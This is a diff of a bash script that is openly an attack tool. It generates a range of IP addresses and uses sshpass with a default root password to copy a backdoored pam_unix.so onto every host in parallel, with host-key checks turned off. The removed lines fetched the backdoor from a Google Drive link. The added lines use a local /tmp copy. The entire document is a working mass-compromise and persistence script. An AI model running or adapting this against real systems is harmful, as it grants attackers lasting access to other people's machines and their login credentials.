@@ -3,9 +3,9 @@
 IPs=()
 username="root"
 default_password="Password1!"
-timeout_duration=3
+timeout_duration=5
 path_to_pam="/lib/x86_64-linux-gnu/security"
-backdoor_link="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
+local_pam_file="/tmp/pam_unix.so"
 
 create_IPs() {
     network_id="1.1"
@@ -20,11 +20,11 @@ create_IPs() {
 
 main() {
     create_IPs
-    export default_password timeout_duration username path_to_pam backdoor_link
+    export default_password timeout_duration username path_to_pam local_pam_file
 
     printf "%s\n" "${IPs[@]}" | xargs -P 20 -n1 -I {} bash -c '
         IP="{}"
-        sshpass -p "$default_password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$backdoor_link" "$username@$IP:$path_to_pam/pam_unix.so" || true
+        sshpass -p "$default_password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$local_pam_file" "$username@$IP:$path_to_pam/pam_unix.so" || true
     '
 }
 
